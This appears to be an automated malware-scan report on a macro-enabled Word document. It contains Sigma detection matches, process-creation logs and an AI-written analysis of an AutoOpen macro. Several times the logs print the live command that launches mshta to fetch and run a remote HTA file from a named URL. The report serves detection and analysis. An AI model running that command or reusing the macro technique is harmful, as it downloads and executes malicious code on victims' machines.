threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

sigma_analysis_results.rule_title: Remotely Hosted HTA File Executed Via Mshta.EXE
sigma_analysis_results.rule_description: Detects execution of the "mshta" utility with an argument containing the "http" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\77bbe8cda3e516e801a.docx.doc" /q; CommandLine=mshta https://christinadudley.com/public_html/cdudley/sites/default/files/1203427/Zjckk0.hta; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\77bbe8cda3e516e801a.docx.doc" /q; CommandLine=mshta https://christinadudley.com/public_html/cdudley/sites/default/files/1203427/Zjckk0.hta; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Suspicious Browser Launch From Document Reader Process
sigma_analysis_results.rule_description: Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\77bbe8cda3e516e801a.docx.doc" /q; CommandLine=mshta https://christinadudley.com/public_html/cdudley/sites/default/files/1203427/Zjckk0.hta; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_ai_results.analysis:
The provided macros exhibit clear signs of malicious intent. The `AutoOpen()` subroutine in the `NewMacros.bas` file is particularly concerning. It utilizes the `Shell` function to execute a command that opens a URL using `mshta`, which is a Windows utility for executing HTML applications (HTA files). This behavior is indicative of an attempt to download and execute potentially harmful content from an external source.

1. Use of `Shell` Function: The use of the `Shell` function to run an external command is a common technique employed by malware to execute arbitrary code. In this case, it is used to launch an HTA file from a remote server.

2. Remote Execution: The URL specified (`https://christinadudley.com/public_html/cdudley/sites/default/files/1203427/Zjckk0.hta`) suggests that the macro is designed to fetch and execute a file hosted on the internet. This raises significant red flags as it could lead to the execution of malicious scripts or payloads without the user's consent.

3. Potential for Malicious Payload: HTA files can contain executable code, and if the fetched HTA file contains malicious instructions, it could compromise the system's security. The fact that the macro does not provide any user prompts or warnings before executing this action further indicates its malicious nature.

4. Lack of User Interaction: The automatic execution of the `AutoOpen()` subroutine upon opening the document suggests an intention to propagate without user awareness, which is a hallmark of malware.

5. Obfuscation and Deception: While there are no overtly obfuscated strings in the visible code, the choice of using an HTA file and the lack of transparency about what the file does can be seen as a form of deception aimed at evading detection.

In conclusion, the combination of executing a remote HTA file, the use of the `Shell` function, and the automatic execution mechanism strongly indicate that these macros are designed with malicious intent.
